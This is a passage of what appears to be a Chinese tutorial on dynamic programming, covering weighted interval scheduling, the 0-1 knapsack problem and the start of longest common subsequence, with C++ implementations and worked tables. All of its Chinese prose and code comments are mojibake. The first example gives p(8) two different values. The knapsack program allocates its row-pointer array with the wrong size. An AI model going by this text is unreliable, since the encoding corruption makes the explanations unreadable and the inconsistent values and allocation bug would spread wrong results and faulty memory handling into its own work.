â€ç†è®ºåˆ†æ\n\n**1ã€åˆ†ææœ€ä¼˜å­ç»“æ„**\n\n- å·¥ä½œ job æŒ‰ç…§å®Œæˆæ—¶é—´å‡åºæ’åˆ—ï¼šf<sub>1</sub>â‰¤f<sub>2</sub>â‰¤â€¦â‰¤ f<sub>n</sub>\n- å®šä¹‰ä¸¤ä¸ªå‚æ•°ï¼š`p(j)`ã€`OPT(j)`\n\n`p(j)` = ä¸å·¥ä½œ j ç›¸å®¹çš„æœ€å¤§çš„å·¥ä½œ i ä¸” i < jï¼Œä¹Ÿå°±æ˜¯è¯´ i æ˜¯ j å·¦è¾¹çš„åœ¨ j å¼€å§‹ä¹‹å‰ç»“æŸçš„åŒºé—´ã€‚\n\nå¦‚ä¸‹å›¾ï¼š\n\np(1) = 0ï¼Œp(2) = 0ï¼Œp(3) = 0ï¼Œp(4) = 1\n\np(5) = 0ï¼Œp(6) = 2ï¼Œp(7) = 3ï¼Œp(8) = 1\n\n![](https://img.jwt1399.top//img/20211012234008.png)\n\n`OPT(j)`è¡¨ç¤ºå‰ j ä¸ªå·¥ä½œ ( 1,2,3,â€¦,j )çš„æœ€å¤§çš„å·¥ä½œæƒé‡ã€‚\n\nOPT(j) æ˜¾ç„¶æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š\n\n- â‘ é€‰æ‹© j å·¥ä½œ\n  - å¦‚æœé€‰æ‹©å·¥ä½œ jï¼ŒåŸé—®é¢˜é€€åŒ–æˆ **v<sub>j</sub>+OPT(P(j))**ï¼Œé€‰æ‹©äº† j æ´»åŠ¨ï¼Œåˆ™ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¸ºä¸èƒ½å’Œ j æ´»åŠ¨å†²çªçš„æœ€å¤§æ´»åŠ¨ P(j) \n- â‘¡ä¸é€‰æ‹© j å·¥ä½œ\n  - å¦‚æœä¸é€‰æ‹©å·¥ä½œ jï¼ŒåŸé—®é¢˜é€€åŒ–æˆ **OPT(j-1)**ï¼Œå³ä»(1,2,3...j-1)ä¸­æ‰¾æœ€ä¼˜è§£\n\n**2ã€å»ºç«‹é€’æ¨å…¬å¼**\n\né€’æ¨å…¬å¼å¦‚ä¸‹ï¼š\n![](https://img.jwt1399.top//img/20211012234021.png)\n\n**3ã€è®¡ç®—`æœ€ä¼˜å€¼`ã€æ„é€ `æœ€ä¼˜è§£`**\n\nä¾‹å¦‚ï¼šç»™å®šå¦‚ä¸‹8ä¸ªå€™é€‰æ´»åŠ¨çš„å¼€å§‹æ—¶é—´ã€ç»“æŸæ—¶é—´å’Œæƒé‡\n\n![](https://img.jwt1399.top//img/20211013182102.png)\n\nä¾æ®é€’æ¨å…¬å¼ï¼Œè®¡ç®—å‡º  `p(j)`ã€`OPT(j)`\n\n| j      | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    |\n| ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| p(j)   | 0    | 0    | 0    | 1    | 0    | 2    | 3    | 5    |\n| OPT(j) | 12   | 20   | 23   | 25   | 26   | 40   | 40   | 42   |\n\np(8) = 5ï¼Œä¸ æ´»åŠ¨8 ç›¸å®¹çš„æœ€å¤§æ´»åŠ¨ä¸º 5\n\np(5) = 0ï¼Œä¸ æ´»åŠ¨5 ç›¸å®¹æœ€å¤§æ´»åŠ¨æ²¡æœ‰\n\n**å› æ­¤é€‰æ‹©æ´»åŠ¨ 8 å’Œ 5**\n\nOPT(2) = max{ OPT(1) ,v<sub>2</sub> + OPT(p(2)) } = max{12,20} = 20\n\nOPT(4) = max{ OPT(3) ,v<sub>4Â </sub>+ OPT(p(4)) } = v<sub>4</sub> + OPT(1) = 13 + 12 = 25\n\nOPT(7) = max{ OPT(6) ,v<sub>7</sub> + OPT(p(7)) } = max{40,34} = 40\n\nOPT(8) = max{ OPT(7) ,v<sub>8</sub> + OPT(p(8)) } = max{40,42} = 42\n\n**å› æ­¤æœ€å¤§æƒé‡ä¹‹å’Œä¸º42**\n\n#### âä»£ç å®ç°\n\n```c\n#include <iostream>\nusing namespace std;\n\ntypedef struct {\n\tint iStartT;\n\tint iFinshT;\n\tint iWight;\n}TASK_INFO;\n\nvoid CreatWeightedScheduling(TASK_INFO *, int);\t\t\t\t\t//åˆ›å»ºæ¯ä¸ªä»»åŠ¡\nvoid PrintWeightedScheduling(TASK_INFO *, int);\nvoid DynamicScheduling(TASK_INFO *, int **, int);\t\t\t\t//ç”¨åŠ¨æ€ç®—æ³•æ±‚è§£æœ€å¤§æƒé‡é—®é¢˜\nvoid FindSolution(TASK_INFO *, int **, int, int *);\t\t\t\t//å¯»æ±‚æœ€å¤§æƒé‡ä»»åŠ¡çš„é›†åˆ\t\n\nvoid CreatWeightedScheduling(TASK_INFO *schedule, int taskNum)\n{\n\tcout << \"è¯·é€ä¸ªè¾“å…¥ä»»åŠ¡çš„å¼€å§‹æ—¶é—´sã€ç»“æŸæ—¶é—´fã€æƒé‡v\\n\";\n\tfor (unsigned int i = 0; i < taskNum; i++)\n\t{\n\t\tcout << \"Task \" << i + 1 << \" information: \";\n\t\tcin >> schedule[i].iStartT >> schedule[i].iFinshT >> schedule[i].iWight;\n\t}\n}\n\nvoid PrintWeightedScheduling(TASK_INFO *schedule, int taskNum)\n{\n\tfor (unsigned int i = 0; i < taskNum; i++)\n\t{\n\t\tcout << \"Task\" << i + 1 << \":\\t\" << schedule[i].iStartT << \"\\t\" << schedule[i].iFinshT << \"\\t\" << schedule[i].iWight << endl;\n\t}\n}\n\n/**\n** key: jå·taskçš„å¼€å§‹æ—¶é—´ï¼Œå³startArray[j]\n** finsh[] && currentIndex: æŸ¥æ‰¾â€œjå·taskçš„å¼€å§‹æ—¶é—´â€åœ¨j-1å·ä¹‹å‰çš„ä»»åŠ¡çš„ç»“æŸæ—¶é—´finishArray[1...j-1]\n**/\nint binarySereach(int key, int finsh[], int currentIndex)\n{\n\tint low = 1, high = currentIndex;\n\twhile (low <= high) {\n\t\tint mid = (low + high) / 2;\n\t\tif (key == finsh[mid])\t\t\t\t\t\t\t\t\t//æ‰¾åˆ°å³è¿”å›Index\n\t\t\treturn mid;\n\t\telse if (key < finsh[mid]) {\t\t\t\t\t\t\t//keyå°äºæ‰€æœ‰çš„finshTimeï¼Œå³æ²¡æœ‰ä¸€ä¸ªä»»åŠ¡ç›¸å®¹\n\t\t\thigh = mid - 1;\n\t\t\tif (high < low)\n\t\t\t\treturn 0;\n\t\t}\n\t\telse {\t\t\t\t\t\t\t\t\t\t\t\t\t//keyå¤§äºæ‰€æœ‰çš„finshTimeï¼Œæœ€å¤§çš„ç›¸å®¹çš„ï¼Œå³high\n\t\t\tlow = mid + 1;\n\t\t\tif (low > high)\n\t\t\t\treturn high;\n\t\t}\n\t}\n\treturn 0;\n}\n\nvoid DynamicScheduling(TASK_INFO *schedule, int **compute, int taskNum)\n{\n\tint* startArray = new int[taskNum + 1];\t\t\t\t\t\t\t\t\t\t\t\t//å°†æ¯ä¸ªä»»åŠ¡çš„å¼€å§‹ã€ç»“æŸæ—¶é—´è½¬å­˜ä¸‹ï¼Œæ–¹ä¾¿è®¡ç®—P(j)\n\tint* finishArray = new int[taskNum + 1];\n\tfor (unsigned int i = 1; i < taskNum + 1; i++)\n\t{\n\t\tstartArray[i] = schedule[i - 1].iStartT;\n\t\tfinishArray[i] = schedule[i - 1].iFinshT;\n\t}\n\n\t//compute P(j) & OPT(j)\n\tfor (unsigned int j = 1; j < taskNum + 1; j++) {\n\t\t//P(j)\n\t\tcompute[0][j] = binarySereach(startArray[j], finishArray, j - 1);\n\n\t\t//OPT(j)ï¼šOPT(j) ? Wj+OPT(P(j))\n\t\tif (compute[1][j - 1] > schedule[j - 1].iWight + compute[1][compute[0][j]])\t\t\t//ç¬¬ä¸€ä¸ªä»»åŠ¡ä¿¡æ¯åœ¨0å·å†…å­˜å•å…ƒçš„ï¼Œæ‰€ä»¥æ˜¯j-1\n\t\t\tcompute[1][j] = compute[1][j - 1];\n\t\telse\n\t\t\tcompute[1][j] = schedule[j - 1].iWight + compute[1][compute[0][j]];\n\t}\n\tdelete[] startArray;\t\t\t\t\t\t//ä»ç†è®ºä¸Šè®²ï¼Œnewçš„å†…å­˜å¿…éœ€è¦deleteæ‰èƒ½é‡Šæ”¾ï¼Œä¸çŸ¥é“ç¼–è¯‘å™¨æœ‰ä¼˜åŒ–æ²¡ï¼Ÿï¼Œè¿˜æ˜¯æ˜¾ç¤ºçš„é‡Šæ”¾ä¸‹\n\tdelete[] finishArray;\n}\n\nint g_i = 0;\nvoid FindSolution(TASK_INFO *schedule, int **compute, int j, int* path)\n{\n\tif (j == 0)\n\t\treturn;\n\telse if (schedule[j - 1].iWight + compute[1][compute[0][j]] > compute[1][j - 1])\t//åé¢å€¼å¤§äºå‰é¢çš„ï¼Œåˆ™åŠ å…¥ï¼›å¦åˆ™j-1\n\t{\n\t\tpath[g_i++] = j;\n\t\treturn FindSolution(schedule, compute, compute[0][j], path);\n\t}\n\telse\n\t\treturn FindSolution(schedule, compute, j - 1, path);\n}\n\n\nint main()\n{\n\tint taskNum = 0;\n\tcout << \"è¯·è¾“å…¥ä½ è¦åˆ†é…æ€»ä»»åŠ¡æ•°ï¼š \";\n\tcin >> taskNum;\n\n\tTASK_INFO *schedule = new TASK_INFO[taskNum];\n\tCreatWeightedScheduling(schedule, taskNum);\n\n\t//ç”¨åŠ¨æ€ç®—æ³•æ±‚è§£æœ€å¤§æƒé‡é—®é¢˜\n\t//compute[2][]:first clow means P(j); second clow means OPT(j)\n\tint **compute = new int*[taskNum + 1];\n\tfor (unsigned int i = 0; i < 2; i++)\t\t\t\t\t\t\t\t\t\t\t//åˆ†é…å†…å­˜åŠç½®0\n\t\tcompute[i] = new int[taskNum + 1];\n\tfor (unsigned int i = 0; i < 2; i++)\n\t\tfor (unsigned int j = 0; j < taskNum + 1; j++)\n\t\t\tcompute[i][j] = 0;\n\n\tDynamicScheduling(schedule, compute, taskNum);\n\n\tcout << \"\\n\";\n\tfor (unsigned int i = 0; i < 2; i++) {\t\t\t\t\t\t\t\t\t\t\t//è¾“å‡ºP(j)ã€OPT(j)\n\t\tif (i == 0)\n\t\t\tcout << \"  P(j):  \";\n\t\telse\n\t\t\tcout << \"OPT(j):  \";\n\t\tfor (unsigned int j = 1; j < taskNum + 1; j++)\n\t\t\tcout << compute[i][j] << \"\\t\";\n\t\tcout << \"\\n\";\n\t}\n\tcout << \"\\næœ€å¤§æƒé‡ä¹‹å’Œï¼š\" << compute[1][taskNum] << endl;\n\n\t//è¾“å‡ºä»»åŠ¡\n\tint* path = new int[taskNum];\t\t\t\t\t\t\t\t\t\t\t\t\t//å­˜å‚¨ä»»åŠ¡çš„æ•°ç»„\n\tfor (int i = 0; i < taskNum; ++i)\n\t\tpath[i] = 0;\n\tFindSolution(schedule, compute, taskNum, path);\n\tcout << \"æœ€ä¼˜æ´»åŠ¨å­é›†ï¼š\";\n\tfor (unsigned int i = 0; i < taskNum && path[i] != 0; i++)\n\t\tcout << path[i] << \"  \";\n\n\tcout << \"\\n\";\n\t//PrintWeightedScheduling(schedule, taskNum);\n\n\tfor (unsigned int i = 0; i < 2; i++)\n\t{\n\t\tdelete[] compute[i];\n\t}\n\tdelete[] compute;\n\tdelete[] schedule;\n\tdelete[] path;\n}\n```\n\n![](https://img.jwt1399.top/img/image-20211013191721686.png)\n\n#### â‚çœŸé¢˜ç»ƒä¹ \n\n##### é¢˜ç›®1\n\n![](https://img.jwt1399.top//img/20211013180909.png)\n\nè®¾ `p(j)` ä¸ºä¸å·¥ä½œ j ç›¸å®¹çš„æœ€å¤§çš„å·¥ä½œ i ä¸” i < j ã€‚`OPT(j)`è¡¨ç¤ºå‰ j ä¸ªå·¥ä½œ ( 1,2,3,â€¦,j )çš„æœ€å¤§çš„å·¥ä½œæƒé‡ã€‚åˆ™é€’å½’å…³ç³»å¼ä¸ºï¼š\n\n![](https://img.jwt1399.top//img/20211013181235.png)\n\nä¾æ®é€’æ¨å…¬å¼ï¼Œè®¡ç®—å‡º  `p(j)`ã€`OPT(j)`\n\n![](https://img.jwt1399.top//img/20211013181844.png)\n\nå› ä¸º OPT(17) = 50 ï¼Œå› æ­¤**æœ€å¤§æƒé‡ä¹‹å’Œä¸º 50**\n\nOPT(17) = OPT(16) = OPT(15) = 50 ï¼Œé€‰æ‹©æ´»åŠ¨ 15ï¼Œp(15) =13ï¼›\n\nOPT(13) = OPT(12) = 45 ï¼Œé€‰æ‹©æ´»åŠ¨ 12ï¼Œp(12) = 7ï¼›\n\nOPT(7) = OPT(6) = 25 ï¼Œé€‰æ‹©æ´»åŠ¨ 6ï¼Œp(6) = 3ï¼›\n\nOPT(3) = 18 ï¼Œp(3) = 0ï¼Œé€‰æ‹©æ´»åŠ¨ 3ï¼Œä¸”é€‰æ‹©å®Œæ¯•ã€‚\n\nå› æ­¤**æœ€ä¼˜æ´»åŠ¨å­é›†ä¸º 3ã€6ã€12ã€15**\n\n### â¸0-1èƒŒåŒ…é—®é¢˜\n\n> **é—®é¢˜æè¿°ï¼š**æœ‰nä¸ªç‰©å“ï¼Œå®ƒä»¬æœ‰å„è‡ªçš„é‡é‡ w<sub>i</sub> å’Œä»·å€¼ v<sub>i</sub> ï¼Œç°æœ‰ç»™å®šå®¹é‡ä¸º C çš„èƒŒåŒ…ï¼Œå¦‚ä½•è®©èƒŒåŒ…é‡Œè£…å…¥çš„ç‰©å“å…·æœ‰æœ€å¤§çš„ä»·å€¼æ€»å’Œï¼Ÿ\n\n#### â€ç†è®ºåˆ†æ\n\n**1ã€åˆ†ææœ€ä¼˜å­ç»“æ„**\n\nå®šä¹‰ä¸€ä¸ªå‚æ•°ï¼š`OPT(i,w)`\n\n`OPT(i,w)`è¡¨ç¤ºè¡¨ç¤ºå‰ i ä¸ªç‰©å“ ( 1,2,3,â€¦,i )çš„æœ€å¤§ä»·å€¼ï¼Œiï¼ˆå½“å‰èƒŒåŒ…å­˜æ”¾ç‰©å“çš„æ•°é‡ï¼‰ã€wï¼ˆå½“å‰èƒŒåŒ…å®¹é‡ï¼‰\n\nOPT(i,w) æ˜¾ç„¶æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š\n\n- â‘ ä¸é€‰æ‹© i ç‰©å“\n  - å¦‚æœä¸é€‰æ‹© i ç‰©å“ï¼ŒåŸé—®é¢˜é€€åŒ–æˆ **OPT(i-1ï¼Œw)**ï¼Œå³åŒ…çš„å‰©ä½™å®¹é‡æ¯” i ç‰©å“é‡é‡å°ï¼Œè£…ä¸ä¸‹ï¼Œæ­¤æ—¶çš„ä»·å€¼ä¸å‰ i-1 ä¸ªçš„ä»·å€¼æ˜¯ä¸€æ ·çš„ï¼Œä»(1,2,3...i-1)ä¸­æ‰¾æœ€ä¼˜è§£\n- â‘¡é€‰æ‹© i ç‰©å“\n  - å¦‚æœé€‰æ‹© i ç‰©å“ï¼ŒåŸé—®é¢˜é€€åŒ–æˆ **v<sub>i</sub> + OPT(i-1ï¼Œw-w<sub>i</sub>)**ï¼Œå³æ—¢ç„¶é€‰æ‹©äº† i ç‰©å“ï¼Œèƒ½è£…çš„é‡é‡å‡å°‘ w<sub>i</sub>ï¼Œå¹¶å°è¯• i-1 æ˜¯å¦è£…å…¥\n\n**2ã€å»ºç«‹é€’æ¨å…¬å¼**\n\né€’æ¨å…¬å¼å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202111111714615.png)\n\n**3ã€è®¡ç®—`æœ€ä¼˜å€¼`ã€æ„é€ `æœ€ä¼˜è§£`**\n\nä¾‹å¦‚ï¼šç»™å®šå¦‚ä¸‹ 5 ä¸ªç‰©å“çš„ä»·å€¼ v<sub>i</sub> å’Œé‡é‡ w<sub>i</sub>ï¼Œé™åˆ¶åŒ…çš„å®¹é‡ C ä¸º11\n\n![](https://img.jwt1399.top/img/202111111714596.png)\n\nä¾æ®é€’æ¨å…¬å¼ï¼Œè®¡ç®—å‡º`OPT(i,w)`\n\n![](https://img.jwt1399.top/img/202111111714543.png)\n\nOPT(2,2) = max{ v<sub>2</sub> + OPT(1,2-w<sub>2</sub>)ï¼ŒOPT(1,2)}  = max{6ï¼Œ1} = 6\n\n...\n\nOPT(3,5) = max{ v<sub>3</sub> + OPT(2,5-w<sub>3</sub>)ï¼ŒOPT(2,5)} =  max{18ï¼Œ7} = 18\n\nOPT(4,11) = max{ v<sub>4</sub> + OPT(3,11-w<sub>4</sub>)ï¼ŒOPT(3,11)} =  max{40ï¼Œ25} = 40\n\nOPT(5,11) = max{ v<sub>5</sub> + OPT(4,11-w<sub>5</sub>)ï¼ŒOPT(4,11)} =  max{35ï¼Œ40} = 40\n\n**å› æ­¤æœ€å¤§ä»·å€¼ä¸º 40ï¼Œç”±å›¾ä¸­çº¢çº¿å›æº¯å¯çŸ¥ï¼ŒèƒŒåŒ…è£…äº†ç‰©å“ 3 å’Œ 4**\n\n#### âä»£ç å®ç°\n\n```c\n#include <iostream>\n#include <iomanip>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//setw()å‡½æ•°\nusing namespace std;\n\ntypedef struct ITEM {\n\tint wight;\t\t\t\t\t\t\t\t\t\t\t\t\t//å•ä¸ªç‰©å“çš„é‡é‡\n\tint value;\t\t\t\t\t\t\t\t\t\t\t\t\t//å•ä¸ªç‰©å“çš„ä»·å€¼\n}ITEM_INFO;\n\nvoid creatItemInfo(ITEM_INFO *items, int itemNum)//åˆ›å»ºèƒŒåŒ…ç‰©å“åŸºæœ¬ä¿¡æ¯\n{\n\tcout << \"è¯·è¾“å…¥(value weigh),ä¾‹å¦‚(1 1)\" << endl;\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t{\n\t\tcout << \"Enter item \" << i + 1 << \" information: \";\n\t\tcin >> items[i].value >> items[i].wight;\n\t}\n}\n\nvoid PrintItemInfo(ITEM_INFO *items, int itemNum)\n{\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t{\n\t\tcout << \"Item\" << i + 1 << \":\\t\" << items[i].value << \"\\t\" << items[i].wight << \"\\t\" << endl;\n\t}\n}\n\nvoid DynamicKnapsack(ITEM_INFO *items, int** m, int maxWeight, int itemNum)//ç”¨åŠ¨æ€è§„åˆ’è§£å†³0/1èƒŒåŒ…é—®é¢˜\n{\n\t//å…¶å®é¦–å…ˆæ˜¯å°†m[0, ],ç¬¬ä¸€è¡Œæ¸…é›¶ï¼Œç”±äºä¹‹å‰å…¨æ¸…é›¶äº†ï¼Œæ‰€ä»¥å°±æ²¡åšè¿™æ­¥äº†\n\n\tfor (unsigned int i = 1; i <= itemNum; i++)\t\t\t\t\t\t\t\t\t\t\t//i:ç‰©å“çš„æ•°é‡ï¼Œä»1åˆ°itemNum\n\t{\n\t\tfor (unsigned int w = 0; w <= maxWeight; w++)\t\t\t\t\t\t\t\t\t//w:èƒŒåŒ…çš„å½“å‰é‡é‡ï¼Œæœ€å¼€å§‹æ²¡æœ‰ç‰©å“ä¸º0ï¼Œæ…¢æ…¢å¢åŠ åˆ°maxWeight\n\t\t{\n\t\t\t//åˆ†ä¸¤ç§æƒ…å†µï¼Œ(1)iå·ç‰©å“ä¸æ”¾å…¥èƒŒåŒ…ï¼›(2 else)iå·ç‰©å“æ”¾å…¥èƒŒåŒ…\n\t\t\tif (items[i - 1].wight > w) {\n\t\t\t\tm[i][w] = m[i - 1][w];\n\t\t\t}\n\t\t\telse {\n\t\t\t\t//OPT(i,w) <== OPT(i-1, w) ? Vi+OPT(i-1, w-wi)\n\t\t\t\tif (m[i - 1][w] > items[i - 1].value + m[i - 1][w - items[i - 1].wight])\n\t\t\t\t\tm[i][w] = m[i - 1][w];\n\t\t\t\telse\n\t\t\t\t\tm[i][w] = items[i - 1].value + m[i - 1][w - items[i - 1].wight];\n\t\t\t}\n\t\t}\n\t}\n}\n\n\nint g_i = 0;\t\t\t//è¿”å›æ´»åŠ¨jå­˜åœ¨pathä¸­\nvoid FindSolution(ITEM_INFO *items, int** m, int i, int w, int* path)//å›æº¯æ±‚è§£é—®é¢˜çš„è§£\n{\n\tif (i == 0 || w == 0)\n\t\treturn;\n\telse if (m[i - 1][w] < items[i - 1].value + m[i - 1][w - items[i - 1].wight])\t//å½“w=0,ä¸èƒ½æ‰§è¡Œè¿™é‡Œäº†ï¼Œé‡é‡å·²ç»0ï¼Œè¿˜å‡å°‘ï¼Ÿè¶Šç•Œï¼Œæ‰€ä»¥ä¸åŠ m==0åˆ¤æ–­ï¼Œä¸‹é¢æ‰§è¡Œå‡ºé”™è¯¯\n\t{\n\t\t//iç‰©å“é€‰ä¸­ï¼Œè¿­ä»£æ—¶å€™æ•°é‡iå‡ä¸€ï¼ŒèƒŒåŒ…èƒ½å®¹é‡çš„é‡é‡å‡wi\n\t\tpath[g_i++] = i;\n\t\treturn FindSolution(items, m, i - 1, w - items[i - 1].wight, path);\t\t\t//è¿™é‡Œæ˜¯items[i - 1]ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªç‰©å“ä¿¡æ¯å­˜æ”¾åœ¨0å·å†…å­˜å•å…ƒçš„\n\t}\n\telse\n\t\t//iç‰©å“æ²¡é€‰ä¸­ï¼Œè¿­ä»£æ—¶å€™æ•°é‡iå‡ä¸€å³å¯\n\t\treturn FindSolution(items, m, i - 1, w, path);\n}\n\n\nint main()\n{\n\tint itemNum = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t//ç‰©å“çš„æ•°é‡\n\tint maxWeight = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t//èƒŒåŒ…æœ€å¤§èƒ½æ”¾çš„é‡é‡\n\tcout << \"ç‰©å“ä¸ªæ•°:\";\n\tcin >> itemNum;\n\tcout << \"èƒŒåŒ…å®¹é‡ï¼š\";\n\tcin >> maxWeight;\n\n\tITEM_INFO *items = new ITEM_INFO[itemNum];\n\n\tcreatItemInfo(items, itemNum);\n\t//PrintItemInfo(items, itemNum);\n    \n\t//å…¶å®m[][]æ˜¯(itemNum+1)*(maxWeight+1),è¦å¤šä¸€è¡Œä¸€åˆ—\n\tint **m = new int*[maxWeight+1];\n\tfor (unsigned int i = 0; i < itemNum+1; i++)\n\t\tm[i] = new int[maxWeight + 1];\n\tfor (unsigned int i = 0; i < itemNum+1; i++)\n\t\tfor (unsigned int j = 0; j < maxWeight +1; j++)\n\t\t\tm[i][j] = 0;\n\n\tDynamicKnapsack(items, m, maxWeight, itemNum);\n\n\tcout << \"\\nm[][]:\\n\";\n\tfor (unsigned int i = 0; i <= itemNum; i++)\n\t{\n\t\tfor (unsigned int j = 0; j <= maxWeight; j++)\n\t\t\tcout << m[i][j] << setw(6);\n\t\tcout << \"\\n\";\n\t}\n\n\tint* path = new int[itemNum];\t\t\t\t\t\t\t\t\t\t\t\t\t//å­˜å‚¨ä»»åŠ¡çš„æ•°ç»„\n\tfor (int i = 0; i < itemNum; ++i)\n\t\tpath[i] = 0;\n\n\tFindSolution(items, m, itemNum, maxWeight, path);\n\n\tcout << \"\\næœ€å¤§æƒé‡ç‰©å“ï¼š\";\n\tfor (unsigned int i = 0; i < itemNum && path[i] != 0; i++)\n\t\tcout << path[i] << \"  \";\n\n\t//é‡Šæ”¾å†…å­˜\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t\tdelete[] m[i];\n\tdelete[] m;\n\tdelete[] items;\n\tdelete[] path;\n\treturn 0;\n}\n```\n\n![](https://img.jwt1399.top/img/202111111713603.png)\n\n\n\n#### â‚01èƒŒåŒ…æ˜¯NP\n\n> ç†è§£0-1èƒŒåŒ…é—®é¢˜çš„åŠ¨æ€è§„åˆ’ç®—æ³•ä¸æ˜¯å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚\n\nP æ˜¯å¦ç­‰äº NP æ˜¯è®¡ç®—å¤æ‚åº¦ç†è®ºé‡Œé¢æœ€è‘—åçš„æœªè§£å†³çš„é—®é¢˜ä¹‹ä¸€ï¼Œä¸€ä¸ª NP å®Œå…¨é—®é¢˜ï¼Œå¦‚æœèƒ½æ‰¾åˆ°è§£å†³å®ƒçš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œé‚£ä¹ˆå°±è¯´æ˜äº† P = NPã€‚\n\nå¦‚ä»Š 0-1 èƒŒåŒ…é—®é¢˜å·²ç»è¢«è¯æ˜æ˜¯ NP å®Œå…¨é—®é¢˜ï¼Œè€Œå®ƒå´æœ‰ç€ä¸€ä¸ªåŠ¨æ€è§„åˆ’è§£æ³•ï¼Œè¯¥è§£æ³•æœ‰ç€ O(n*W) çš„æ—¶é—´å¤æ‚åº¦ï¼Œå…¶ä¸­ n æ˜¯ç‰©å“çš„ä¸ªæ•°ï¼ŒW æ˜¯èƒŒåŒ…é™åˆ¶çš„æœ€å¤§è´Ÿé‡ã€‚æ‰€ä»¥æ—¶é—´å¤æ‚åº¦å¯¹è¾“å…¥ nï¼ŒW æ¥è¯´æ˜¯å¤šé¡¹å¼æ—¶é—´çš„ï¼Œæ‰€ä»¥è¯´æ˜äº† NP = P æ˜¯ä¸æ˜¯å“ªé‡Œå‡ºé”™äº†å‘¢ï¼Ÿ\n\nå…¶å®å¤šé¡¹å¼æ—¶é—´æ˜¯ç›¸å¯¹äºè¾“å…¥è§„æ¨¡æ¥è¯´çš„ï¼Œè¾“å…¥è§„æ¨¡æœ€ç›´è§‚çš„ç†è§£å°±æ˜¯è¾“å…¥åˆ°è¯¥ç®—æ³•çš„æ•°æ®å äº†å¤šå°‘æ¯”ç‰¹å†…å­˜ã€‚0-1 èƒŒåŒ…çš„è¾“å…¥æœ‰ n ä¸ªç‰©å“çš„ä»·å€¼ï¼Œn ä¸ªç‰©å“çš„é‡é‡ï¼Œè¿˜æœ‰èƒŒåŒ…çš„æœ€å¤§è´Ÿé‡ Wã€‚å¦‚ä»Šå‡è®¾ W å ç”¨çš„æ¯”ç‰¹æ•°ä¸º Lï¼ˆä¹Ÿå°±æ˜¯è¯´èƒŒåŒ…çš„æœ€å¤§è´Ÿé‡çš„è¾“å…¥è§„æ¨¡æ˜¯ Lï¼‰ï¼Œé‚£ä¹ˆ log(W) = Lï¼Œæ‰€ä»¥ O(n\\*W) = O(n*2<sup>L</sup>)ï¼Œç”±æ­¤çœ‹åˆ°ï¼Œè¯¥ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦å¯¹äºè¾“å…¥è§„æ¨¡ L æ¥è¯´æ˜¯æŒ‡æ•°çº§åˆ«çš„ï¼Œéšç€è¾“å…¥è§„æ¨¡ L çš„å¢åŠ ï¼Œè¿ç®—æ—¶é—´ä¼šè¿…é€Ÿå¢é•¿ã€‚\n\nå®é™…ä¸Šï¼Œäººä»¬æŠŠè¿™ç§åŠ¨æ€è§„åˆ’çš„ç®—æ³•ç§°ä¸ºä¼ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼ˆpseudo-polynomial time algorithmï¼‰ï¼Œè¿™ç§ç®—æ³•ä¸èƒ½çœŸæ­£æ„ä¹‰ä¸Šå®ç°å¤šé¡¹å¼æ—¶é—´å†…è§£å†³é—®é¢˜ã€‚\n\n#### âƒçœŸé¢˜ç»ƒä¹ \n\n##### é¢˜ç›®1\n\n![](https://img.jwt1399.top/img/image-20211104201447553.png)\n\n![](https://img.jwt1399.top/img/image-20211210165447955.png)\n\n##### é¢˜ç›®2\n\n![](https://img.jwt1399.top/img/image-20211104223426667.png)\n\n### â¹æœ€é•¿å…¬å…±å­åºåˆ—\n\n> **é—®é¢˜æè¿°ï¸°**ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ±‚è§£è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å­åºåˆ—(LCS)ã€‚å¦‚: X={1,5,2,8,9,3,6},Y={5,6,8,9,3,7}ï¼Œå…¶æœ€é•¿å…¬å…±å­åºåˆ—ä¸º{5,8,9,3}ï¼Œæœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦ä¸º4ã€‚é‚£ä¹ˆå¦‚ä½•æ±‚è§£å‘¢ï¼Ÿ\n\n#### â€ç†è®ºåˆ†æ\n\n**1ã€åˆ†ææœ€ä¼˜å­ç»“æ„**\n\nè®¾åºåˆ— **X={x<sub>1</sub>, x<sub>2</sub>, â€¦, x<sub>i</sub>}** å’Œ **Y={y<sub>1</sub>, y<sub>2</sub>, â€¦, y<sub>j</sub>}** çš„æœ€é•¿å…¬å…±å­åºåˆ—ä¸º **Z={z<sub>1</sub>, z<sub>2</sub>, â€¦, z<sub>k</sub>}**ï¼Œåˆ™\n\n- â‘ è‹¥ **x<sub>i</sub>=y<sub>j</sub>** ï¼Œåˆ™ z<sub>k</sub>=x<sub>i</sub>=y<sub>j</sub> ä¸” **Z<sub>k-1</sub>** æ˜¯ X<sub>i-1</sub> å’Œ Y<sub>j-1Â </sub>çš„æœ€é•¿å…¬å…±å­åºåˆ—;\n\n- â‘¡è‹¥ **x<sub>i</sub>â‰ y<sub>j</sub>** ä¸” **z<sub>k</sub>â‰ x<sub>i</sub>** ï¼Œåˆ™ **Z<sub>k</sub>** æ˜¯ X<sub>i-1Â </sub>å’Œ Y<sub>j</sub> çš„æœ€é•¿å…¬å…±å­åºåˆ—;.\n\n- â‘¢è‹¥ **x<sub>i</sub>â‰ y<sub>j</sub>** ä¸” **z<sub>k</sub>â‰ y<sub>j</sub>** ï¼Œåˆ™ **Z<sub>kÂ </sub>**æ˜¯ X<sub>i</sub> å’Œ Y<sub>j-1 </sub>çš„æœ€é•¿å…¬å…±å­åºåˆ—ã€‚\n\n**2ã€å»ºç«‹é€’æ¨å…¬å¼**\n\nç”¨**`c[i][j]`**è¡¨ç¤º **X<sub>i</sub>={x<sub>1</sub>, 